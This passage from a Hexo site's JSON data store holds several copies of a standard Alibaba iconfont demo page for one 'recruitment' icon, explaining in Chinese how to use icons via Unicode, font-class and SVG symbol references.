target=\"_blank\">&#xe86b;</a></h1>\n    <div class=\"nav-tabs\">\n      <ul id=\"tabs\" class=\"dib-box\">\n        <li class=\"dib active\"><span>Unicode</span></li>\n        <li class=\"dib\"><span>Font class</span></li>\n        <li class=\"dib\"><span>Symbol</span></li>\n      </ul>\n      \n    </div>\n    <div class=\"tab-container\">\n      <div class=\"content unicode\" style=\"display: block;\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n              <span class=\"icon iconfont\">&#xe688;</span>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">&amp;#xe688;</div>\n              </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"unicode-\">Unicode 引用</h2>\n          <hr>\n\n          <p>Unicode 是字体在网页端最原始的应用方式，特点是：</p>\n          <ul>\n            <li>兼容性最好，支持 IE6+，及所有现代浏览器。</li>\n            <li>支持按字体的方式去动态调整图标大小，颜色等等。</li>\n            <li>但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。</li>\n          </ul>\n          <blockquote>\n            <p>注意：新版 iconfont 支持多色图标，这些多色图标在 Unicode 模式下将不能使用，如果有需求建议使用symbol 的引用方式</p>\n          </blockquote>\n          <p>Unicode 使用步骤如下：</p>\n          <h3 id=\"-font-face\">第一步：拷贝项目下面生成的 <code>@font-face</code></h3>\n<pre><code class=\"language-css\"\n>@font-face {\n  font-family: 'iconfont';\n  src: url('iconfont.eot');\n  src: url('iconfont.eot?#iefix') format('embedded-opentype'),\n      url('iconfont.woff2') format('woff2'),\n      url('iconfont.woff') format('woff'),\n      url('iconfont.ttf') format('truetype'),\n      url('iconfont.svg#iconfont') format('svg');\n}\n</code></pre>\n          <h3 id=\"-iconfont-\">第二步：定义使用 iconfont 的样式</h3>\n<pre><code class=\"language-css\"\n>.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取字体编码，应用于页面</h3>\n<pre>\n<code class=\"language-html\"\n>&lt;span class=\"iconfont\"&gt;&amp;#x33;&lt;/span&gt;\n</code></pre>\n          <blockquote>\n            <p>\"iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n          </blockquote>\n          </div>\n      </div>\n      <div class=\"content font-class\">\n        <ul class=\"icon_lists dib-box\">\n          \n          <li class=\"dib\">\n            <span class=\"icon iconfont icon-zhaopin\"></span>\n            <div class=\"name\">\n              招聘\n            </div>\n            <div class=\"code-name\">.icon-zhaopin\n            </div>\n          </li>\n          \n        </ul>\n        <div class=\"article markdown\">\n        <h2 id=\"font-class-\">font-class 引用</h2>\n        <hr>\n\n        <p>font-class 是 Unicode 使用方式的一种变种，主要是解决 Unicode 书写不直观，语意不明确的问题。</p>\n        <p>与 Unicode 使用方式相比，具有如下特点：</p>\n        <ul>\n          <li>兼容性良好，支持 IE8+，及所有现代浏览器。</li>\n          <li>相比于 Unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。</li>\n          <li>因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 Unicode 引用。</li>\n          <li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li>\n        </ul>\n        <p>使用步骤如下：</p>\n        <h3 id=\"-fontclass-\">第一步：引入项目下面生成的 fontclass 代码：</h3>\n<pre><code class=\"language-html\">&lt;link rel=\"stylesheet\" href=\"./iconfont.css\"&gt;\n</code></pre>\n        <h3 id=\"-\">第二步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;span class=\"iconfont icon-xxx\"&gt;&lt;/span&gt;\n</code></pre>\n        <blockquote>\n          <p>\"\n            iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n        </blockquote>\n      </div>\n      </div>\n      <div class=\"content symbol\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n                <svg class=\"icon svg-icon\" aria-hidden=\"true\">\n                  <use xlink:href=\"#icon-zhaopin\"></use>\n                </svg>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">#icon-zhaopin</div>\n            </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"symbol-\">Symbol 引用</h2>\n          <hr>\n\n          <p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇<a href=\"\">文章</a>\n            这种用法其实是做了一个 SVG 的集合，与另外两种相比具有如下特点：</p>\n          <ul>\n            <li>支持多色图标了，不再受单色限制。</li>\n            <li>通过一些技巧，支持像字体那样，通过 <code>font-size</code>, <code>color</code> 来调整样式。</li>\n            <li>兼容性较差，支持 IE9+，及现代浏览器。</li>\n            <li>浏览器渲染 SVG 的性能一般，还不如 png。</li>\n          </ul>\n          <p>使用步骤如下：</p>\n          <h3 id=\"-symbol-\">第一步：引入项目下面生成的 symbol 代码：</h3>\n<pre><code class=\"language-html\">&lt;script src=\"./iconfont.js\"&gt;&lt;/script&gt;\n</code></pre>\n          <h3 id=\"-css-\">第二步：加入通用 CSS 代码（引入一次就行）：</h3>\n<pre><code class=\"language-html\">&lt;style&gt;\n.icon {\n  width: 1em;\n  height: 1em;\n  vertical-align: -0.15em;\n  fill: currentColor;\n  overflow: hidden;\n}\n&lt;/style&gt;\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;svg class=\"icon\" aria-hidden=\"true\"&gt;\n  &lt;use xlink:href=\"#icon-xxx\"&gt;&lt;/use&gt;\n&lt;/svg&gt;\n</code></pre>\n          </div>\n      </div>\n\n    </div>\n  </div>\n  <script>\n  $(document).ready(function () {\n      $('.tab-container .content:first').show()\n\n      $('#tabs li').click(function (e) {\n        var tabContent = $('.tab-container .content')\n        var index = $(this).index()\n\n        if ($(this).hasClass('active')) {\n          return\n        } else {\n          $('#tabs li').removeClass('active')\n          $(this).addClass('active')\n\n          tabContent.hide().eq(index).fadeIn()\n        }\n      })\n    })\n  </script>\n</body>\n</html>\n","source":"hireme/fonts/iconfont/demo_index.html","raw":"<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\"/>\n  <title>IconFont Demo</title>\n  <link rel=\"shortcut icon\" href=\"https://gtms04.alicdn.com/tps/i4/TB1_oz6GVXXXXaFXpXXJDFnIXXX-64-64.ico\" type=\"image/x-icon\"/>\n  <link rel=\"stylesheet\" href=\"https://g.alicdn.com/thx/cube/1.3.2/cube.min.css\">\n  <link rel=\"stylesheet\" href=\"demo.css\">\n  <link rel=\"stylesheet\" href=\"iconfont.css\">\n  <script src=\"iconfont.js\"></script>\n  <!-- jQuery -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/7bfddb60-08e8-11e9-9b04-53e73bb6408b.js\"></script>\n  <!-- 代码高亮 -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/a3f714d0-08e6-11e9-8a15-ebf944d7534c.js\"></script>\n</head>\n<body>\n  <div class=\"main\">\n    <h1 class=\"logo\"><a href=\"https://www.iconfont.cn/\" title=\"iconfont 首页\" target=\"_blank\">&#xe86b;</a></h1>\n    <div class=\"nav-tabs\">\n      <ul id=\"tabs\" class=\"dib-box\">\n        <li class=\"dib active\"><span>Unicode</span></li>\n        <li class=\"dib\"><span>Font class</span></li>\n        <li class=\"dib\"><span>Symbol</span></li>\n      </ul>\n      \n    </div>\n    <div class=\"tab-container\">\n      <div class=\"content unicode\" style=\"display: block;\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n              <span class=\"icon iconfont\">&#xe688;</span>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">&amp;#xe688;</div>\n              </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"unicode-\">Unicode 引用</h2>\n          <hr>\n\n          <p>Unicode 是字体在网页端最原始的应用方式，特点是：</p>\n          <ul>\n            <li>兼容性最好，支持 IE6+，及所有现代浏览器。</li>\n            <li>支持按字体的方式去动态调整图标大小，颜色等等。</li>\n            <li>但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。</li>\n          </ul>\n          <blockquote>\n            <p>注意：新版 iconfont 支持多色图标，这些多色图标在 Unicode 模式下将不能使用，如果有需求建议使用symbol 的引用方式</p>\n          </blockquote>\n          <p>Unicode 使用步骤如下：</p>\n          <h3 id=\"-font-face\">第一步：拷贝项目下面生成的 <code>@font-face</code></h3>\n<pre><code class=\"language-css\"\n>@font-face {\n  font-family: 'iconfont';\n  src: url('iconfont.eot');\n  src: url('iconfont.eot?#iefix') format('embedded-opentype'),\n      url('iconfont.woff2') format('woff2'),\n      url('iconfont.woff') format('woff'),\n      url('iconfont.ttf') format('truetype'),\n      url('iconfont.svg#iconfont') format('svg');\n}\n</code></pre>\n          <h3 id=\"-iconfont-\">第二步：定义使用 iconfont 的样式</h3>\n<pre><code class=\"language-css\"\n>.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取字体编码，应用于页面</h3>\n<pre>\n<code class=\"language-html\"\n>&lt;span class=\"iconfont\"&gt;&amp;#x33;&lt;/span&gt;\n</code></pre>\n          <blockquote>\n            <p>\"iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n          </blockquote>\n          </div>\n      </div>\n      <div class=\"content font-class\">\n        <ul class=\"icon_lists dib-box\">\n          \n          <li class=\"dib\">\n            <span class=\"icon iconfont icon-zhaopin\"></span>\n            <div class=\"name\">\n              招聘\n            </div>\n            <div class=\"code-name\">.icon-zhaopin\n            </div>\n          </li>\n          \n        </ul>\n        <div class=\"article markdown\">\n        <h2 id=\"font-class-\">font-class 引用</h2>\n        <hr>\n\n        <p>font-class 是 Unicode 使用方式的一种变种，主要是解决 Unicode 书写不直观，语意不明确的问题。</p>\n        <p>与 Unicode 使用方式相比，具有如下特点：</p>\n        <ul>\n          <li>兼容性良好，支持 IE8+，及所有现代浏览器。</li>\n          <li>相比于 Unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。</li>\n          <li>因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 Unicode 引用。</li>\n          <li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li>\n        </ul>\n        <p>使用步骤如下：</p>\n        <h3 id=\"-fontclass-\">第一步：引入项目下面生成的 fontclass 代码：</h3>\n<pre><code class=\"language-html\">&lt;link rel=\"stylesheet\" href=\"./iconfont.css\"&gt;\n</code></pre>\n        <h3 id=\"-\">第二步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;span class=\"iconfont icon-xxx\"&gt;&lt;/span&gt;\n</code></pre>\n        <blockquote>\n          <p>\"\n            iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n        </blockquote>\n      </div>\n      </div>\n      <div class=\"content symbol\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n                <svg class=\"icon svg-icon\" aria-hidden=\"true\">\n                  <use xlink:href=\"#icon-zhaopin\"></use>\n                </svg>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">#icon-zhaopin</div>\n            </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"symbol-\">Symbol 引用</h2>\n          <hr>\n\n          <p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇<a href=\"\">文章</a>\n            这种用法其实是做了一个 SVG 的集合，与另外两种相比具有如下特点：</p>\n          <ul>\n            <li>支持多色图标了，不再受单色限制。</li>\n            <li>通过一些技巧，支持像字体那样，通过 <code>font-size</code>, <code>color</code> 来调整样式。</li>\n            <li>兼容性较差，支持 IE9+，及现代浏览器。</li>\n            <li>浏览器渲染 SVG 的性能一般，还不如 png。</li>\n          </ul>\n          <p>使用步骤如下：</p>\n          <h3 id=\"-symbol-\">第一步：引入项目下面生成的 symbol 代码：</h3>\n<pre><code class=\"language-html\">&lt;script src=\"./iconfont.js\"&gt;&lt;/script&gt;\n</code></pre>\n          <h3 id=\"-css-\">第二步：加入通用 CSS 代码（引入一次就行）：</h3>\n<pre><code class=\"language-html\">&lt;style&gt;\n.icon {\n  width: 1em;\n  height: 1em;\n  vertical-align: -0.15em;\n  fill: currentColor;\n  overflow: hidden;\n}\n&lt;/style&gt;\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;svg class=\"icon\" aria-hidden=\"true\"&gt;\n  &lt;use xlink:href=\"#icon-xxx\"&gt;&lt;/use&gt;\n&lt;/svg&gt;\n</code></pre>\n          </div>\n      </div>\n\n    </div>\n  </div>\n  <script>\n  $(document).ready(function () {\n      $('.tab-container .content:first').show()\n\n      $('#tabs li').click(function (e) {\n        var tabContent = $('.tab-container .content')\n        var index = $(this).index()\n\n        if ($(this).hasClass('active')) {\n          return\n        } else {\n          $('#tabs li').removeClass('active')\n          $(this).addClass('active')\n\n          tabContent.hide().eq(index).fadeIn()\n        }\n      })\n    })\n  </script>\n</body>\n</html>\n","date":"2020-06-18T07:09:21.446Z","updated":"2020-06-18T07:09:21.446Z","path":"hireme/fonts/iconfont/demo_index.html","title":"","comments":1,"layout":"page","_id":"ckclr4uae001gqrwtavm7yxx9","content":"<!DOCTYPE html>\n<html>\n<head><meta name=\"generator\" content=\"Hexo 3.8.0\">\n  <meta charset=\"utf-8\">\n  <title>IconFont Demo</title>\n  <link rel=\"shortcut icon\" href=\"https://gtms04.alicdn.com/tps/i4/TB1_oz6GVXXXXaFXpXXJDFnIXXX-64-64.ico\" type=\"image/x-icon\">\n  <link rel=\"stylesheet\" href=\"https://g.alicdn.com/thx/cube/1.3.2/cube.min.css\">\n  <link rel=\"stylesheet\" href=\"demo.css\">\n  <link rel=\"stylesheet\" href=\"iconfont.css\">\n  <script src=\"iconfont.js\"></script>\n  <!-- jQuery -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/7bfddb60-08e8-11e9-9b04-53e73bb6408b.js\"></script>\n  <!-- 代码高亮 -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/a3f714d0-08e6-11e9-8a15-ebf944d7534c.js\"></script>\n</head>\n<body>\n  <div class=\"main\">\n    <h1 class=\"logo\"><a href=\"https://www.iconfont.cn/\" title=\"iconfont 首页\" target=\"_blank\">&#xe86b;</a></h1>\n    <div class=\"nav-tabs\">\n      <ul id=\"tabs\" class=\"dib-box\">\n        <li class=\"dib active\"><span>Unicode</span></li>\n        <li class=\"dib\"><span>Font class</span></li>\n        <li class=\"dib\"><span>Symbol</span></li>\n      </ul>\n      \n    </div>\n    <div class=\"tab-container\">\n      <div class=\"content unicode\" style=\"display: block;\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n              <span class=\"icon iconfont\">&#xe688;</span>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">&amp;#xe688;</div>\n              </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"unicode-\">Unicode 引用</h2>\n          <hr>\n\n          <p>Unicode 是字体在网页端最原始的应用方式，特点是：</p>\n          <ul>\n            <li>兼容性最好，支持 IE6+，及所有现代浏览器。</li>\n            <li>支持按字体的方式去动态调整图标大小，颜色等等。</li>\n            <li>但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。</li>\n          </ul>\n          <blockquote>\n            <p>注意：新版 iconfont 支持多色图标，这些多色图标在 Unicode 模式下将不能使用，如果有需求建议使用symbol 的引用方式</p>\n          </blockquote>\n          <p>Unicode 使用步骤如下：</p>\n          <h3 id=\"-font-face\">第一步：拷贝项目下面生成的 <code>@font-face</code></h3>\n<pre><code class=\"language-css\">@font-face {\n  font-family: 'iconfont';\n  src: url('iconfont.eot');\n  src: url('iconfont.eot?#iefix') format('embedded-opentype'),\n      url('iconfont.woff2') format('woff2'),\n      url('iconfont.woff') format('woff'),\n      url('iconfont.ttf') format('truetype'),\n      url('iconfont.svg#iconfont') format('svg');\n}\n</code></pre>\n          <h3 id=\"-iconfont-\">第二步：定义使用 iconfont 的样式</h3>\n<pre><code class=\"language-css\">.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取字体编码，应用于页面</h3>\n<pre>\n<code class=\"language-html\">&lt;span class=\"iconfont\"&gt;&amp;#x33;&lt;/span&gt;\n</code></pre>\n          <blockquote>\n            <p>\"iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n          </blockquote>\n          </div>\n      </div>\n      <div class=\"content font-class\">\n        <ul class=\"icon_lists dib-box\">\n          \n          <li class=\"dib\">\n            <span class=\"icon iconfont icon-zhaopin\"></span>\n            <div class=\"name\">\n              招聘\n            </div>\n            <div class=\"code-name\">.icon-zhaopin\n            </div>\n          </li>\n          \n        </ul>\n        <div class=\"article markdown\">\n        <h2 id=\"font-class-\">font-class 引用</h2>\n        <hr>\n\n        <p>font-class 是 Unicode 使用方式的一种变种，主要是解决 Unicode 书写不直观，语意不明确的问题。</p>\n        <p>与 Unicode 使用方式相比，具有如下特点：</p>\n        <ul>\n          <li>兼容性良好，支持 IE8+，及所有现代浏览器。</li>\n          <li>相比于 Unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。</li>\n          <li>因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 Unicode 引用。</li>\n          <li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li>\n        </ul>\n        <p>使用步骤如下：</p>\n        <h3 id=\"-fontclass-\">第一步：引入项目下面生成的 fontclass 代码：</h3>\n<pre><code class=\"language-html\">&lt;link rel=\"stylesheet\" href=\"./iconfont.css\"&gt;\n</code></pre>\n        <h3 id=\"-\">第二步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;span class=\"iconfont icon-xxx\"&gt;&lt;/span&gt;\n</code></pre>\n        <blockquote>\n          <p>\"\n            iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n        </blockquote>\n      </div>\n      </div>\n      <div class=\"content symbol\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n                <svg class=\"icon svg-icon\" aria-hidden=\"true\">\n                  <use xlink:href=\"#icon-zhaopin\"/>\n                </svg>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">#icon-zhaopin</div>\n            </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"symbol-\">Symbol 引用</h2>\n          <hr>\n\n          <p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇<a href>文章</a>\n            这种用法其实是做了一个 SVG 的集合，与另外两种相比具有如下特点：</p>\n          <ul>\n            <li>支持多色图标了，不再受单色限制。</li>\n            <li>通过一些技巧，支持像字体那样，通过 <code>font-size</code>, <code>color</code> 来调整样式。</li>\n            <li>兼容性较差，支持 IE9+，及现代浏览器。</li>\n            <li>浏览器渲染 SVG 的性能一般，还不如 png。</li>\n          </ul>\n          <p>使用步骤如下：</p>\n          <h3 id=\"-symbol-\">第一步：引入项目下面生成的 symbol 代码：</h3>\n<pre><code class=\"language-html\">&lt;script src=\"./iconfont.js\"&gt;&lt;/script&gt;\n</code></pre>\n          <h3 id=\"-css-\">第二步：加入通用 CSS 代码（引入一次就行）：</h3>\n<pre><code class=\"language-html\">&lt;style&gt;\n.icon {\n  width: 1em;\n  height: 1em;\n  vertical-align: -0.15em;\n  fill: currentColor;\n  overflow: hidden;\n}\n&lt;/style&gt;\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;svg class=\"icon\" aria-hidden=\"true\"&gt;\n  &lt;use xlink:href=\"#icon-xxx\"&gt;&lt;/use&gt;\n&lt;/svg&gt;\n</code></pre>\n          </div>\n      </div>\n\n    </div>\n  </div>\n  <script>\n  $(document).ready(function () {\n      $('.tab-container .content:first').show()\n\n      $('#tabs li').click(function (e) {\n        var tabContent = $('.tab-container .content')\n        var index = $(this).index()\n\n        if ($(this).hasClass('active')) {\n          return\n        } else {\n          $('#tabs li').removeClass('active')\n          $(this).addClass('active')\n\n          tabContent.hide().eq(index).fadeIn()\n        }\n      })\n    })\n  </script>\n</body>\n</html>\n","site":{"data":{}},"excerpt":"","more":"<!DOCTYPE html>\n<html>\n<head><meta name=\"generator\" content=\"Hexo 3.8.0\">\n  <meta charset=\"utf-8\">\n  <title>IconFont Demo</title>\n  <link rel=\"shortcut icon\" href=\"https://gtms04.alicdn.com/tps/i4/TB1_oz6GVXXXXaFXpXXJDFnIXXX-64-64.ico\" type=\"image/x-icon\">\n  <link rel=\"stylesheet\" href=\"https://g.alicdn.com/thx/cube/1.3.2/cube.min.css\">\n  <link rel=\"stylesheet\" href=\"demo.css\">\n  <link rel=\"stylesheet\" href=\"iconfont.css\">\n  <script src=\"iconfont.js\"></script>\n  <!-- jQuery -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/7bfddb60-08e8-11e9-9b04-53e73bb6408b.js\"></script>\n  <!-- 代码高亮 -->\n  <script src=\"https://a1.alicdn.com/oss/uploads/2018/12/26/a3f714d0-08e6-11e9-8a15-ebf944d7534c.js\"></script>\n</head>\n<body>\n  <div class=\"main\">\n    <h1 class=\"logo\"><a href=\"https://www.iconfont.cn/\" title=\"iconfont 首页\" target=\"_blank\">&#xe86b;</a></h1>\n    <div class=\"nav-tabs\">\n      <ul id=\"tabs\" class=\"dib-box\">\n        <li class=\"dib active\"><span>Unicode</span></li>\n        <li class=\"dib\"><span>Font class</span></li>\n        <li class=\"dib\"><span>Symbol</span></li>\n      </ul>\n      \n    </div>\n    <div class=\"tab-container\">\n      <div class=\"content unicode\" style=\"display: block;\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n              <span class=\"icon iconfont\">&#xe688;</span>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">&amp;#xe688;</div>\n              </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"unicode-\">Unicode 引用</h2>\n          <hr>\n\n          <p>Unicode 是字体在网页端最原始的应用方式，特点是：</p>\n          <ul>\n            <li>兼容性最好，支持 IE6+，及所有现代浏览器。</li>\n            <li>支持按字体的方式去动态调整图标大小，颜色等等。</li>\n            <li>但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。</li>\n          </ul>\n          <blockquote>\n            <p>注意：新版 iconfont 支持多色图标，这些多色图标在 Unicode 模式下将不能使用，如果有需求建议使用symbol 的引用方式</p>\n          </blockquote>\n          <p>Unicode 使用步骤如下：</p>\n          <h3 id=\"-font-face\">第一步：拷贝项目下面生成的 <code>@font-face</code></h3>\n<pre><code class=\"language-css\">@font-face {\n  font-family: 'iconfont';\n  src: url('iconfont.eot');\n  src: url('iconfont.eot?#iefix') format('embedded-opentype'),\n      url('iconfont.woff2') format('woff2'),\n      url('iconfont.woff') format('woff'),\n      url('iconfont.ttf') format('truetype'),\n      url('iconfont.svg#iconfont') format('svg');\n}\n</code></pre>\n          <h3 id=\"-iconfont-\">第二步：定义使用 iconfont 的样式</h3>\n<pre><code class=\"language-css\">.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取字体编码，应用于页面</h3>\n<pre>\n<code class=\"language-html\">&lt;span class=\"iconfont\"&gt;&amp;#x33;&lt;/span&gt;\n</code></pre>\n          <blockquote>\n            <p>\"iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n          </blockquote>\n          </div>\n      </div>\n      <div class=\"content font-class\">\n        <ul class=\"icon_lists dib-box\">\n          \n          <li class=\"dib\">\n            <span class=\"icon iconfont icon-zhaopin\"></span>\n            <div class=\"name\">\n              招聘\n            </div>\n            <div class=\"code-name\">.icon-zhaopin\n            </div>\n          </li>\n          \n        </ul>\n        <div class=\"article markdown\">\n        <h2 id=\"font-class-\">font-class 引用</h2>\n        <hr>\n\n        <p>font-class 是 Unicode 使用方式的一种变种，主要是解决 Unicode 书写不直观，语意不明确的问题。</p>\n        <p>与 Unicode 使用方式相比，具有如下特点：</p>\n        <ul>\n          <li>兼容性良好，支持 IE8+，及所有现代浏览器。</li>\n          <li>相比于 Unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。</li>\n          <li>因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 Unicode 引用。</li>\n          <li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li>\n        </ul>\n        <p>使用步骤如下：</p>\n        <h3 id=\"-fontclass-\">第一步：引入项目下面生成的 fontclass 代码：</h3>\n<pre><code class=\"language-html\">&lt;link rel=\"stylesheet\" href=\"./iconfont.css\"&gt;\n</code></pre>\n        <h3 id=\"-\">第二步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;span class=\"iconfont icon-xxx\"&gt;&lt;/span&gt;\n</code></pre>\n        <blockquote>\n          <p>\"\n            iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。</p>\n        </blockquote>\n      </div>\n      </div>\n      <div class=\"content symbol\">\n          <ul class=\"icon_lists dib-box\">\n          \n            <li class=\"dib\">\n                <svg class=\"icon svg-icon\" aria-hidden=\"true\">\n                  <use xlink:href=\"#icon-zhaopin\"/>\n                </svg>\n                <div class=\"name\">招聘</div>\n                <div class=\"code-name\">#icon-zhaopin</div>\n            </li>\n          \n          </ul>\n          <div class=\"article markdown\">\n          <h2 id=\"symbol-\">Symbol 引用</h2>\n          <hr>\n\n          <p>这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇<a href>文章</a>\n            这种用法其实是做了一个 SVG 的集合，与另外两种相比具有如下特点：</p>\n          <ul>\n            <li>支持多色图标了，不再受单色限制。</li>\n            <li>通过一些技巧，支持像字体那样，通过 <code>font-size</code>, <code>color</code> 来调整样式。</li>\n            <li>兼容性较差，支持 IE9+，及现代浏览器。</li>\n            <li>浏览器渲染 SVG 的性能一般，还不如 png。</li>\n          </ul>\n          <p>使用步骤如下：</p>\n          <h3 id=\"-symbol-\">第一步：引入项目下面生成的 symbol 代码：</h3>\n<pre><code class=\"language-html\">&lt;script src=\"./iconfont.js\"&gt;&lt;/script&gt;\n</code></pre>\n          <h3 id=\"-css-\">第二步：加入通用 CSS 代码（引入一次就行）：</h3>\n<pre><code class=\"language-html\">&lt;style&gt;\n.icon {\n  width: 1em;\n  height: 1em;\n  vertical-align: -0.15em;\n  fill: currentColor;\n  overflow: hidden;\n}\n&lt;/style&gt;\n</code></pre>\n          <h3 id=\"-\">第三步：挑选相应图标并获取类名，应用于页面：</h3>\n<pre><code class=\"language-html\">&lt;svg class=\"icon\" aria-hidden=\"true\"&gt;\n  &lt;use xlink:href=\"#icon-xxx\"&gt;&lt;/use&gt;\n&lt;/svg&gt;\n</code></pre>\n          </div>\n      </div>\n\n    </div>\n  </div>\n  <script>\n  $(document).ready(function () {\n      $('.tab-container .content:first').show()\n\n      $('#tabs li').click(function (e) {\n        var tabContent = $('.tab-container .content')\n        var index = $(this).index()\n\n        if ($(this).hasClass('active')) {\n          return\n        } else {\n          $('#tabs li').removeClass('active')\n          $(this).addClass('active')\n\n          tabContent.hide().eq(index).fadeIn()\n        }\n      })\n    })\n  </script>\n</body>\n</html>\n"},{"_content":"@font-face {font-family: \"iconfont\";\n  src: url('iconfont.eot?t=1551757320444'); /* IE9 */\n  src: url('iconfont.eot?t=1551757320444#iefix') format('embedded-opentype'), /* IE6-IE8 */\n  